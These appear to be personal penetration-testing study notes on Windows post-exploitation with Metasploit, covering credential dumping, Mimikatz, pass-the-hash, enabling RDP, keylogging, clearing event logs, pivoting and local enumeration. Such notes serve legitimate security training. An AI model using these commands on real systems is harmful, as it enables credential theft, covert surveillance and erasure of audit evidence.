![](</Images/Pasted image 20240103201637.png>)
### different metasploit commands

### meterpreter
getsystem
> use to elevate privs

hashdump
> dump hashes

#NTML hash format
username:UID:LM hash:NTML hash
### modules (can also use #Kiwi via load in meterpreter)
win_privs
> enumerate current user privs

enum_logged_on_users
> numerate users that are logged on

checkvm
> check to see if system is vm or not. Useful to see if breaking out of vm is possible

enum_applicaitons
> see what programs are installed along with versions

enum_av_exluded
> will show folders that are excluded from AV program. If there is one exploits can be hidden here

enum_computers
>enumerate connected machines

enum_patches
> enumerate applied patches

All of this info is stored locally. if created in a workspace `loot` command will list out these files

### Mimikatz
This is Kiwi running Mimikatz in memory. Due to Mimikatz needing to be uploaded to target system. Can be found here:

From meterpreter: `upload /.usr/share/windows-resources/mimikatz/` then find correct version and file. Execute once on system. Commands are different. ie `privilege::debug` format

Pass the hash with #psexec 
See [Tools](obsidian://open?vault=cheatsheet&file=Tools%2FPSExec)

### enable RDP post explotation
`search enable_rdp`

That enables rdp along with port. Once done use #xfreerdp to connect. Requires credentials which can be created with `enable_rdp`

To login:
```
xfrerdp /u:<user> /p:<pass> /v:<ip>
```

### keylogging

Feature inside meterpreter
`keyscan_start`
`keyscan_dump`
`keyscan_stop`

### clearing windows event logs
From meterpreter `clearev`

### Pivoting
#pivoting

With #meterpreter 
Run ipconfig for IP 

`run autoroute -s <ip>/<subnet>`

Note route is **only** available for msf tools using this method. To scan for ports on new machine use `auxiliary/scanner/portscan/tcp`

If use is needed outside of msf port forwarding is required. Done in meterpreter
`portfwd add -l <local port> -p <port to forward> -r <new IP>`

Then to use nmap scan local  port from above:
`db_nmap -sV -p <local port from above> localhost`

If attempting a meterpreter session use `windows/meterpreter/bind_tcp` change port if running meterpreter already

![](</Images/Pasted image 20240115133710.png>)
## Enumerating
![](</Images/Pasted image 20240115134525.png>)

### meterpreter
getuid: get user info
sysinfo: get system info
getprivs: see privileges 

### command prompt
hostname: hostname
systeminfo: gives a lot of info on system, including hotfixes

## WMIC 
use once logged onto windows system
Collects additional system info especially with hotfixes
`wmic qfe get Caption,Description,HotFixID,Installation`

# Enumerating Users and Groups
### meterpreter
getuid check for admin level
getprivs: lists out privileges
shell: open cmd.exe

### shell
whoami: show user info
whoami /priv: shows privs
query user: shows current logged on users !important
net users: shows other accounts in system
net user administrator: shows info on particular user. administrator in example
net localgroup administrators: lists members in a group

### metasploit
post/windows/gather/enum_logged_on_users: shows users that have logged in recently
post/windows/gather/win_privs: msf script to show privs
enum_computers: will enumerated all connected computers

show_mount: shows mounted drives
# Enumerating Network Information

![](</Images/Pasted image 20240115151100.png>)
### shell
ipconfig: shows network information
ipconfig /all: additional network information
route print: gives rounting info
arp -a list arp information
netstat -ano: lists active connections
netsh advfirewall firewall dump: gives firewall info
netsh advfirewall firewall show allprofiles: show if windows firewall is running
netsh advfirewall: gives help menu

Seeing firewall rules can help with listeners on open ports

# Enumerating Processes & Services

![](</Images/Pasted image 20240115152552.png>)

### meterpreter
ps: list out running processes
pgrep explorer.exe: to search for PID by process name
- migrate to explorer.exe preferred
migrate 2176: migrate to a process

### shell
net start: shows background services that are started. Not processes
wmic service list brief: similar to ps
tasklist /SVC: lists running processes, services, PID's
schtasks /query /fo LIST v: lists scheduled tasks (like crontab for exploitation)

# Automating Windows Local Enumeration

### JAWS
automated script to help enumeration and find escalation vectors. Can be found [here](www.github.com/411Hall/JAWS)

crtl + shift + alt to open clipbpard in guacamole

upload file into Temp and swtich meterpreter to shell to execute

Need to set executpoion policy first

powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt